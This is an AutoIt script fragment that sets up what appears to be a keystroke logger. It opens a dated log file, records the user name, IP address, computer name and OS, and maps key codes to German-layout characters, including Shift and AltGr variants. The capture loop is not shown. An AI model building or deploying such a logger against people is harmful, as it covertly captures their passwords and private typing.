;~ Global $sLogFile = @YEAR & @MON & @MDAY & @HOUR & @MIN & @SEC & @MSEC & '.log'
Global $sLogFile = @YEAR & @MON & @MDAY & '.md'
Global $hLogFile = FileOpen($sLogFile, 1 + 8 + 256)

Global $sUserInformation = _
    '| Category   | Value |'                                        & @CRLF & _
    '| ---------- | ----- |'                                        & @CRLF & _
    '| User       | ' & @UserName                            & ' |' & @CRLF & _
    '| IPAddress1 | ' & @IPAddress1                          & ' |' & @CRLF & _
    '| Computer   | ' & @ComputerName                        & ' |' & @CRLF & _
    '| Resolution | ' & @DesktopWidth & 'x' & @DesktopHeight & ' |' & @CRLF & _
    '| OS         | ' & @OSVersion & ' ' & @OSArch           & ' |' & @CRLF & _
    '| CPUArch    | ' & @CPUArch                             & ' |' & @CRLF & @CRLF & _
    '```'

Global $sCurrentWindow = ''

Global $aFKeys[12][2] = _
    [ _
        ['70', '[F1]'], _
        ['71', '[F2]'], _
        ['72', '[F3]'], _
        ['73', '[F4]'], _
        ['74', '[F5]'], _
        ['75', '[F6]'], _
        ['76', '[F7]'], _
        ['77', '[F8]'], _
        ['78', '[F9]'], _
        ['79', '[F10]'], _
        ['7A', '[F11]'], _
        ['7B', '[F12]'] _
    ]

Global $aNumberKeys[10][2] = _
    [ _
        ['30', '0'], _
        ['31', '1'], _
        ['32', '2'], _
        ['33', '3'], _
        ['34', '4'], _
        ['35', '5'], _
        ['36', '6'], _
        ['37', '7'], _
        ['38', '8'], _
        ['39', '9'] _
    ]

Global $aNumpadKeys[10][2] = _
    [ _
        ['60', '[Num 0]'], _
        ['61', '[Num 1]'], _
        ['62', '[Num 2]'], _
        ['63', '[Num 3]'], _
        ['64', '[Num 4]'], _
        ['65', '[Num 5]'], _
        ['66', '[Num 6]'], _
        ['67', '[Num 7]'], _
        ['68', '[Num 8]'], _
        ['69', '[Num 9]'] _
    ]

Global $aCalcKeys[5][2] = _
    [ _
        ['6A', '*'], _
        ['6B', '+'], _
        ['6D', '-'], _
        ['6E', ','], _
        ['6F', '/'] _
    ]

Global $aAlphabetKeys[26][2] = _
    [ _
        ['41', 'a'], _
        ['42', 'b'], _
        ['43', 'c'], _
        ['44', 'd'], _
        ['45', 'e'], _
        ['46', 'f'], _
        ['47', 'g'], _
        ['48', 'h'], _
        ['49', 'i'], _
        ['4A', 'j'], _
        ['4B', 'k'], _
        ['4C', 'l'], _
        ['4D', 'm'], _
        ['4E', 'n'], _
        ['4F', 'o'], _
        ['50', 'p'], _
        ['51', 'q'], _
        ['52', 'r'], _
        ['53', 's'], _
        ['54', 't'], _
        ['55', 'u'], _
        ['56', 'v'], _
        ['57', 'w'], _
        ['58', 'x'], _
        ['59', 'y'], _
        ['5A', 'z'] _
    ]

Global $aUmlautKeys[4][2] = _
    [ _
        ['BA', 'ü'], _
        ['C0', 'ö'], _
        ['DB', 'ß'], _
        ['DE', 'ä'] _
    ]

Global $aNavKeys[14][2] = _
    [ _
        ['08', '[BACKSPACE]'], _
        ['09', '[TAB]'], _
        ['0D', '[ENTER]'], _
        ['20', ' '], _
        ['21', '[PGUP]'], _
        ['22', '[PGDW]'], _
        ['23', '[END]'], _
        ['24', '[HOME]'], _
        ['25', '[LEFT]'], _
        ['26', '[UP]'], _
        ['27', '[RIGHT]'], _
        ['28', '[DOWN]'], _
        ['2D', '[INS]'], _
        ['2E', '[DEL]'] _
    ]

Global $aControlKeys[7][2] = _
    [ _
        ['13', '[PAUSE]'], _
        ['14', '[CAPS LOCK]'], _
        ['1B', '[ESC]'], _
        ['2C', '[PRINT]'], _
        ['5B', '[WIN]'], _
        ['90', '[NUM LOCK]'], _
        ['91', '[SCROLL LOCK]'] _
    ]

Global $aSpecialCharKeys[8][2] = _
    [ _
        ['BB', '+'], _
        ['BC', ','], _
        ['BD', '-'], _
        ['BE', '.'], _
        ['BF', '#'], _
        ['DC', '^'], _
        ['DD', '´'], _
        ['E2', '<'] _
    ]

Global $aShiftKeys[22][2] = _
    [ _
        ['30', '='], _
        ['31', '!'], _
        ['32', '"'], _
        ['33', '§'], _
        ['34', '$'], _
        ['35', '%'], _
        ['36', '&'], _
        ['37', '/'], _
        ['38', '('], _
        ['39', ')'], _
        ['BA', 'Ü'], _
        ['BB', '*'], _
        ['BC', ';'], _
        ['BD', '_'], _
        ['BE', ':'], _
        ['BF', "'"], _
        ['C0', 'Ö'], _
        ['DB', '?'], _
        ['DC', '°'], _
        ['DD', '`'], _
        ['DE', 'Ä'], _
        ['E2', '>'] _
    ]

Global $aAltKeys[12][2] = _
    [ _
        ['30', '}'], _
        ['32', '²'], _
        ['33', '³'], _
        ['37', '{'], _
        ['38', '['], _
        ['39', ']'], _
        ['45', '€'], _
        ['4D', 'µ'], _
        ['51', '@'], _
        ['BB', '~'], _
        ['DB', '\'], _
        ['E2', '|'] _
    ]
